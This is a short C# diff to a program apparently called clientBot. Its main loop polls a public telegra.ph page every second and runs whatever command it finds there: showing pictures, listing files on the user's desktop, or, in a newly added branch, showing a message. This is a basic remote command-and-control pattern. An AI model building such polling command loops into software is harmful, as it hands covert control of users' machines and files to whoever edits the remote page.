@@ -16,19 +16,23 @@ namespace clientBot4._7
         [STAThread]
         static void Main()
         {
-            BotFunctions bt = new BotFunctions();
+            WebCommand wc = new WebCommand("https://telegra.ph/Tets-09-14");
+            BotFunctions bt = new BotFunctions(wc);
             while (true)
             {
                 Thread.Sleep(1000);
-                WebCommand wc = new WebCommand("https://telegra.ph/Tets-09-14");
                 Console.WriteLine(wc.command);
-                if (wc.command == " reb")
+                if (wc.command == "reb")
                 {
                     bt.ShowPrettyPictures();
                 }
-                if (wc.command == " dir")
+                if (wc.command == "dir")
                 {
                     bt.GetAllFilesOnDesktop();                    
+                }
+                if(wc.command == "msg")
+                {
+                    bt.ShowMessage();
                 }
             }
 
